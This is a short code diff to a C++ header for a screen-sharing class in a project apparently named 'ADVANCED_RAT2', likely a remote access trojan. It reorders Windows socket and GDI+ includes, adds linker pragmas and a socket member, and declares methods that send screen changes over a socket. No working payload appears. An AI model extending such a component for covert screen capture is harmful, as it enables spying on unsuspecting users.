@@ -2,17 +2,27 @@
 // Created by avita on 09/08/2020.
 //
 
+
 #ifndef ADVANCED_RAT2_SHARESCREEN_H
 #define ADVANCED_RAT2_SHARESCREEN_H
 
 
 #include <iostream>
+
+
+
+#include <WS2tcpip.h>
 #include <windows.h>
 #include <GdiPlus.h>
-#include <memory>
-#include <WS2tcpip.h>
 
-//#include "Connection.h"
+
+
+#include <memory>
+
+
+#pragma warning(disable:4996)
+#pragma comment(lib, "ws2_32.lib")
+#pragma comment( lib, "gdiplus" )
 
 
 using namespace std;
@@ -48,6 +58,8 @@ public:
 
     //Comparing two images and returning the bytes that changed
     Color** compareImages(Color** img1[1440][2580], Color** img2[1440][2580]);
+
+    SOCKET socket;
 
     //Screen sharing in the first time sending img1 and after sending the bytes that changed between img1 and img2
     void ShareScreenLive(SOCKET socket);
